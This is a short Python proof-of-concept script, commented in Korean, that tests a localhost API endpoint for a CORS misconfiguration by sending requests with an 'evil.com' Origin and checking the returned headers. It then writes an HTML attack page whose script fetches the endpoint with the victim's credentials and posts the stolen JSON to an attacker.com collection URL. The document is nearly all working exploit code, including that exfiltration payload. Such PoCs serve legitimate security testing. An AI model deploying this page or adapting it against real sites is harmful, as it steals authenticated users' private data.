# CORS Misconfiguration PoC
# Endpoint: http://localhost:5000/api/v1/posts
# Method: GET

import requests

# 악의적인 Origin에서 요청
evil_origin = "https://evil.com"
headers = {
    "Origin": evil_origin,
    "Access-Control-Request-Method": "GET",
    "Access-Control-Request-Headers": "authorization"
}

# Preflight 요청
response = requests.options("http://localhost:5000/api/v1/posts", headers=headers)
print(f"Preflight Response Headers:")
for header, value in response.headers.items():
    if 'access-control' in header.lower():
        print(f"  {header}: {value}")

# 실제 요청
response = requests.get("http://localhost:5000/api/v1/posts", headers={"Origin": evil_origin})
acao = response.headers.get('Access-Control-Allow-Origin', '')
acac = response.headers.get('Access-Control-Allow-Credentials', '')

if acao == evil_origin or acao == '*':
    print(f"[+] CORS 취약점 확인!")
    print(f"    ACAO: {acao}")
    print(f"    ACAC: {acac}")
    if acac.lower() == 'true':
        print(f"[!] 크리덴셜 포함 가능 - 높은 위험도!")

# 악의적인 HTML 페이지 예시
html_poc = '''<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
fetch('http://localhost:5000/api/v1/posts', {
    credentials: 'include',
    headers: {'Origin': 'https://evil.com'}
})
.then(response => response.json())
.then(data => {
    console.log('Stolen data:', data);
    // 공격자 서버로 데이터 전송
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
</body>
</html>'''

with open('cors_poc.html', 'w') as f:
    f.write(html_poc)
print("[*] cors_poc.html 생성 완료")